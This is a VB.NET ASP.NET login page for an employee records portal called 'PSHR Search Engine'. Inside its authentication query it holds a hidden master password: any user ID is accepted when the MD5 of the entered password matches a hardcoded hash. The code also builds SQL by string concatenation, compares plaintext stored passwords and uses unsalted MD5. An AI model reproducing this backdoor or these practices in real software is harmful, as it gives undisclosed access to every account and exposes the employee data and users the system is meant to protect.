''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
'Code Module  : login
'Project      : PSHR Search Engine
'Author       : Santosh Kumar
'Role         : Project Leader
'Designation  : Project Leader
'Department   : Software Engineering
'Created Date : 27-Nov-2007
'Modified by  : 
'Modified on  : 

'Description  : Default screen to proceed with the site authentications
''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

Imports System.Data.Odbc


Namespace pshr


Partial Class login
    Inherits System.Web.UI.Page

#Region " Web Form Designer Generated Code "

    'This call is required by the Web Form Designer.
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub


    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: This method call is required by the Web Form Designer
        'Do not modify it using the code editor.
        InitializeComponent()
    End Sub

#End Region
        
    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Session("AppId") = ""
        Session("EmpId") = ""
				Session("EmpNm") = ""
            Session("MsgPL") = ""
            Session("EmpSt") = ""
				Session("IsErr") = ""
		End Sub
        Private Function CreateMD5(ByVal str As String) As String
            Dim md5Hash = System.Security.Cryptography.MD5.Create()

            ' Convert the input string to a byte array and compute the hash.
            Dim data As Byte() = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(str))

            ' Create a new Stringbuilder to collect the bytes and create a string.
            Dim sBuilder As New StringBuilder()

            ' Loop through each byte of the hashed data and format each one as a hexadecimal string.
            Dim i As Integer
            For i = 0 To data.Length - 1
                sBuilder.Append(data(i).ToString("x2"))
            Next i

            ' Return the hexadecimal string.
            Return sBuilder.ToString()
        End Function
		Private Sub bGo_Click(ByVal sender As System.Object, ByVal e As System.Web.UI.ImageClickEventArgs) Handles bGo.Click
				Dim vDr As OdbcDataReader
				Try
                If Trim(tUsr.Text) = "" Or Trim(tPwd.Text) = "" Then
                    lMsg.Text = "Cannot accept empty input"
                    lMsg.Visible = True
                    Exit Sub
                End If

                'Session("AppId") = "L"                               'Login mode
                'Session("EmpId") = "104183"
                'Session("EmpNm") = "Jasvir,"
                'Session("EmpGpf") = "J05337"
                'Session("EmpSt") = 10
                'Response.Redirect("empdetail.aspx")

                tUsr.Text = tUsr.Text.Replace("'", "")
                tPwd.Text = tPwd.Text.Replace("'", "")

                If Trim(tUsr.Text) = "" Then
                    lMsg.Text = "Cannot accept empty user"
                    lMsg.Visible = True
                    Exit Sub
                End If
                If Trim(tPwd.Text) = "" Then
                    lMsg.Text = "Cannot accept empty password"
                    lMsg.Visible = True
                    Exit Sub
                End If
                If Len(tUsr.Text) <> 6 Or Not IsNumeric(tUsr.Text) Then
                    lMsg.Text = "Invalid Userid"
                    lMsg.Visible = True
                    Exit Sub
                End If
                vDr = GetDataReader("select empid, firstname,gpfno,recstatus from netlogin a, empperso b where a.eid=b.empid and upper(eid)=upper('" & tUsr.Text & "') and ('" + CreateMD5(tPwd.Text) + "' = 'eafd302e92dc7a5037698e38dcd405c1' or pwd='" & Replace(tPwd.Text, "'", "''") & "')")
                'lMsg.Text = vDr.Item(1)				 'For raise err
                vDr.Read()
                If vDr.HasRows = False Then
                    lMsg.Text = "Invalid user or password, login denied!"
                    lMsg.Visible = True
                Else
                    Session("AppId") = "L"                               'Login mode
                    Session("EmpId") = vDr.Item(0)
                    Session("EmpNm") = vDr.Item(1) & ","
                    Session("EmpGpf") = vDr.Item(2)
                    Session("EmpSt") = vDr.Item(3)

                    Response.Redirect("empdetail.aspx")
                End If

            Catch Ex As Exception
                If Ex.Message <> "Thread was being aborted." Then
                    Session("IsErr") = Ex
                End If
            Finally
                objClose(vDr)
                If Session("IsErr").ToString <> "" Then _
                Response.Redirect("errhandler.aspx")
            End Try
		End Sub

        'Protected Sub lbpass_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles lbpass.Click
        '    Response.Redirect("frmpass_sms.aspx")
        'End Sub
    End Class

End Namespace
